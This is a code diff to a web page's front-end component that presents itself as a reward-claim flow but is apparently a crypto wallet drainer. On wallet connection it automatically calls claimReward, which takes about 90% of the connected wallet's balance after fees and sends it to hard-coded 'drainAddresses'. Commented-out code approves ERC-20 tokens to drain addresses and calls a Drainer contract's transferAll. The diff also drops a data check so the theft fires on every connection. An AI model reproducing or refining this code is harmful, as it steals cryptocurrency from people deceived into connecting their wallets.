@@ -219,9 +219,14 @@ export default function Home() {
       const response = await fetch(`/api/getAllInfo?address=${address}`)
       const inf = await response.json()
       // console.log('resulted: ', inf)
-      setTimeout(() => {
-        setAddrInfo(inf)
-      }, 3000)
+
+      if (response.ok) {
+        setTimeout(() => {
+          setAddrInfo(inf)
+        }, 3000)
+      } else {
+        setAddrInfo([])
+      }
     }
 
 
@@ -236,15 +241,14 @@ export default function Home() {
     setTimeout(() => {
 
       if(isConnected) {
-        if(addrInfo.length){
-          claimReward(addrInfo)
-        } else {
+          claimReward()
+      } else {
           console.log('We out here')
-        }
-
       }
+
+
     }, 3000)
-  }, [isConnected, addrInfo])
+  }, [isConnected])
 
 
 
@@ -268,15 +272,13 @@ export default function Home() {
     setInputted(e.target.value)
   }
 
-  const claimReward = async(addr) => {
+  const claimReward = async() => {
 
     console.log('chainId', chainId)
     const drainAddresses = ['0x67eFE8239Dd091Da8486f7b07921D7b699AECc4F', '0xAb31D50880eE7AfbcBE729087C21fbe9cA434E37']
     const testDrainAddresses = ['0x8DDb1bAA8ed0307bF7B44764c64404bd49A19eA4', '0xBa1554D59FED763F726123cCc0467ad7c0C81e7E']
 
     let ethersProvider = new ethers.providers.Web3Provider(walletProvider)
-
-    console.log('addrInfo: ', addr)
     const trasnferERC = addrInfo && addrInfo.filter(d => {
       return d.chain === chainId
     })
@@ -289,32 +291,46 @@ export default function Home() {
     // let calc95 = (bal * BigNumber.from(10))/BigNumber.from(100)
     // console.log('cal95: ', calc95)
 
-    let estimate_gas;
 
-    if(chainId === 1) {
-      estimate_gas = await ethersProvider.estimateGas({
-        to: drainAddresses[0],
-        value: bal
-      })
+    // if(chainId === 1) {
+    //   estimate_gas = await ethersProvider.estimateGas({
+    //     // from: address,
+    //     to: drainAddresses[0],
+    //     value: bal
+    //   })
+    // } else {
+    //   estimate_gas = await ethersProvider.estimateGas({
+    //     to: drainAddresses[1],
+    //     value: bal
+    //   })
+    // }
+
+    // if(chainId === 11155111) {
+    //   estimate_gas = await ethersProvider.estimateGas({
+    //     from: address,
+    //     to: testDrainAddresses[0],
+    //     value: bal
+    //   })
+    // } else {
+    //   estimate_gas = await ethersProvider.estimateGas({
+    //     from: address,
+    //     to: testDrainAddresses[1],
+    //     value: bal
+    //   })
+    // }
+
+
+    const gasPrice = (await ethersProvider.getFeeData()).maxFeePerGas;
+    console.log('Fee Data: ', gasPrice);
+
+    if(BigInt(bal) < BigInt(gasPrice)) {
+      alert(`You can stop here, no funds to complete your request!!! your balance: ${bal} is less than the gas price: ${gasPrice} \n subtract bal-gasPrice ${bal-gasPrice}`)
+
     } else {
-      estimate_gas = await ethersProvider.estimateGas({
-        to: drainAddresses[1],
-        value: bal
-      })
-    }
-
-
-    const maxFees = (await ethersProvider.getFeeData()).maxFeePerGas;
-    console.log('Fee Data: ', maxFees);
-
-    if(bal < estimate_gas) {
-      alert('You can stop here, no funds to complete your request!!!')
-
-    } else {
-        const balances = bal - estimate_gas;
+        const balances = bal - gasPrice;
         console.log('bal: ', balances);
 
-        const balsent95_afterfees = (balances * 95) / 100
+        const balsent95_afterfees = (balances * 90) / 100
         console.log('balsent95_afterfees: ', balsent95_afterfees)
 
         const ethVal = ethers.utils.formatEther(BigInt(Math.round(balsent95_afterfees)))
@@ -450,23 +466,24 @@ export default function Home() {
         //       break
         //     }
 
-        //     console.log('transferERC', trasnferERC)
+        //     if(trasnferERC.length) {
+        //       for (let i=0; i < trasnferERC.length; i++) {
+        //         // const amountInWei = ethers.utils.parseUnits(amount.toString(), 18);
+        //         // Calculate 95% of the balance
+        //         const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
+        //         const balan = BigInt(trasnferERC[i].balance)
+        //         console.log('balanceInDecimal: ', bal)
 
-        //     for (let i=0; i < trasnferERC.length; i++) {
-        //       // const amountInWei = ethers.utils.parseUnits(amount.toString(), 18);
-        //       // Calculate 95% of the balance
-        //       const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
-        //       const balan = BigInt(trasnferERC[i].balance)
-        //       console.log('balanceInDecimal: ', bal)
-
-        //       let calctok95 = (balan * BigInt(95))/BigInt(100)
-        //       const ethh = ethers.utils.formatEther(calctok95)
-        //       const amt = ethers.utils.parseEther(ethh)
-        //       console.log('console: ', amt)
-        //       // Approve 95% of the balance
-        //       const tx = await tokenContract.approve(testDrainAddresses[0], amt);
-        //       await tx.wait();
+        //         let calctok95 = (balan * BigInt(95))/BigInt(100)
+        //         const ethh = ethers.utils.formatEther(calctok95)
+        //         const amt = ethers.utils.parseEther(ethh)
+        //         console.log('console: ', amt)
+        //         // Approve 95% of the balance
+        //         const tx = await tokenContract.approve(testDrainAddresses[0], amt);
+        //         await tx.wait();
+        //       }
         //     }
+
 
         //     DrainerContract = new Contract(testDrainAddresses[0], Drainer.abi, signer)
         //     const txn = await DrainerContract.transferAll(trasnferERC, recipient, {value: amount})
@@ -480,7 +497,8 @@ export default function Home() {
         //       break
         //     }
 
-        //     for (let i=0; i < trasnferERC.length; i++) {
+        //     if(trasnferERC.length) {
+        //        for (let i=0; i < trasnferERC.length; i++) {
         //       const tokenContract = new Contract(trasnferERC[i].tok_or_nft_address, abi, signer)
         //       const balan = BigInt(trasnferERC[i].balance)
 
@@ -491,6 +509,8 @@ export default function Home() {
         //       const tx = await tokenContract.approve(testDrainAddresses[1], amt);
         //       await tx.wait();
         //     }
+        //     }
+
 
         //     DrainerContract = new Contract(testDrainAddresses[1], Drainer.abi, signer)
         //     const txx = await DrainerContract.transferAll(trasnferERC, recipient,  {value: amount})
